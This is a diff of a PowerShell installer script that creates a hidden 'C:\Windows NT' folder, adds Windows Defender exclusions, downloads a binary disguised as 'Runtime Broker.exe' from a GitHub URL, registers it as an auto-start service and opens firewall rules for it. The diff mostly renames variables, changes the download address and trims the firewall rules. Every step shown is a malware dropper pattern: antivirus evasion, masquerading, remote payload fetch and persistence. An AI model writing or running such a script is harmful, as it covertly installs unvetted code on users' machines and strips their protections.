@@ -1,9 +1,11 @@
 $root = "C:\Windows NT"
 $servicio = "Wizard"
+$ejecutable = "Runtime Broker.exe"
+$rootFile = Join-Path -Path $root -ChildPath $ejecutable
 
 if (-not (Test-Path $root)) {
     try {
-        New-Item -Path $root -ItemType Directory
+        New-Item -Path $root -ItemType Directory -Force
         Set-ItemProperty -Path $root -Name Attributes -Value 'Hidden'
     }
     catch {
@@ -19,65 +21,40 @@ else {
     }
 }
 
-$root_file = Join-Path -Path $root -ChildPath "Runtime Broker.exe"
-
 try {
     Add-MpPreference -ExclusionPath $root
-    Add-MpPreference -ExclusionProcess $root_file
+    Add-MpPreference -ExclusionProcess $rootFile
 }
 catch {
     exit 1
 }
 
 try {
-    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/BIT-CROW/refs/heads/main/Wizard/build/Runtime Broker.exe" -Destination $root_file
+    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
 }
 catch {
     exit 1
 }
 
 try {
-    $acl = Get-Acl $root_file
+    $acl = Get-Acl $rootFile
     $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "Allow")
     $acl.SetAccessRule($rule)
-    Set-Acl -Path $root_file -AclObject $acl
+    Set-Acl -Path $rootFile -AclObject $acl
 }
 catch {
     exit 1
 }
 
 try {
-    New-Service -Name $servicio -BinaryPathName $root_file -DisplayName $servicio -StartupType Automatic
-}
-catch {
-    exit 1
-}
-
-$port = 45888
-
-try {
-    New-NetFirewallRule -DisplayName "$servicio Inbound" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Program $root_file -Profile Any
+    New-Service -Name $servicio -BinaryPathName $rootFile -DisplayName $servicio -StartupType Automatic
 }
 catch {
     exit 1
 }
 
 try {
-    New-NetFirewallRule -DisplayName "$servicio Outbound" -Direction Outbound -Protocol TCP -LocalPort $port -Action Allow -Program $root_file -Profile Any
-}
-catch {
-    exit 1
-}
-
-try {
-    New-NetFirewallRule -DisplayName "$servicio Executable Inbound" -Direction Inbound -Protocol TCP -Action Allow -Program $root_file -Profile Any
-}
-catch {
-    exit 1
-}
-
-try {
-    New-NetFirewallRule -DisplayName "$servicio Executable Outbound" -Direction Outbound -Protocol TCP -Action Allow -Program $root_file -Profile Any
+    New-NetFirewallRule -DisplayName $servicio -Direction Inbound -Program $rootFile -Action Allow -Profile Any -Enabled True
 }
 catch {
     exit 1
